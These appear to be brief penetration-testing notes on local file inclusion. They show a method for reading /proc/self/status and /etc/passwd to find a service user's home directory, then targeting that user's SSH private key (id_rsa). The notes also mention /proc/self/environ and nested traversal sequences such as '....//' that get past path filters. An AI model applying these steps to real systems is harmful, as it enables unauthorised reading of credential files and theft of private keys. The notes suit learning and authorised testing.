Local file inclusion

# check id_rsa
1 - check /proc/self/status
```
Name:	httpd
State:	R (running)
SleepAVG:	81%
Tgid:	4248
Pid:	4248
PPid:	3488
TracerPid:	0
Uid:	100	100	100	100
Gid:	101	101	101	101
FDSize:	32
Groups:	101 
VmPeak:	   38784 kB
VmSize:	   38344 kB
VmLck:	       0 kB
VmHWM:	   18572 kB
VmRSS:	   18252 kB
VmData:	   12516 kB
VmStk:	      88 kB
VmExe:	     300 kB
VmLib:	   20928 kB
VmPTE:	      84 kB
StaBrk:	099f3000 kB
Brk:	0a53d000 kB
StaStk:	bfbbd270 kB
ExecLim:	08179000
Threads:	1
SigQ:	0/16384
SigPnd:	0000000000000000
ShdPnd:	0000000000000000
SigBlk:	0000000000000000
SigIgn:	0000000001001000
SigCgt:	000000018c00466b
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
Cpus_allowed:	00000001
Mems_allowed:	1
Sorry! Attempt to access restricted file.
```
GET GID value

2 - check /etc/passwd for value 101
```
[...]
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
[...]

3 - check for id_rsa
/var/lib/asterisk/.ssh/id_rsa

# proc self environ
- check proc self environ

You might be able to use nested traversal sequences, such as ....// or ....\/, which will revert to simple traversal sequences when the inner sequence is stripped. 
